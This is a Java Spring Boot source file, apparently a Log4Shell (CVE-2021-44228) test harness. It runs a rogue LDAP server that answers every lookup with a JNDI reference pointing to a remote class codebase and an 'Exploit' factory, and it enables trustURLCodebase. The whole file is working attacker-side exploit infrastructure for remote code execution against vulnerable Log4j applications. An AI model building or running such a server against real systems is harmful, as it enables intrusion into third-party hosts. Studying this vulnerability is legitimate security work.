package org.vanderzee.log4jtest;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import javax.annotation.PostConstruct;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

/*
 * See:
 * - https://github.com/mbechler/marshalsec
 * - https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
 */

@SpringBootApplication
public class Application {
    private static final Logger logger = LogManager.getLogger(Application.class);

    private static final String LDAP_BASE = "dc=vanderzee,dc=org";
    private static final int PORT = 12345;

    private static final String OBJECT_CLASS = "javaNamingReference";
    private static final String JAVA_CODE_BASE = "http://localhost:8080/code";
    private static final String JAVA_FACTORY = "Exploit";
    private static final String JAVA_CLASS_NAME = "foo";

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        SpringApplication.run(Application.class, args);
    }

    @PostConstruct
    public void setup() {
        logger.info("setup");
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    PORT,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            logger.info("LDAP listening on 0.0.0.0:" + PORT);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry entry = new Entry(base);
            try {
                sendResult(result, base, entry);
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
            logger.info("sendResult: Send LDAP reference result for '{}' redirecting to '{}' with factory '{}' and class '{}'",
                    base, JAVA_CODE_BASE, JAVA_FACTORY, JAVA_CLASS_NAME);

            entry.addAttribute("javaClassName", JAVA_CLASS_NAME);
            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE);
            entry.addAttribute("objectClass", OBJECT_CLASS);
            entry.addAttribute("javaFactory", JAVA_FACTORY);

            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
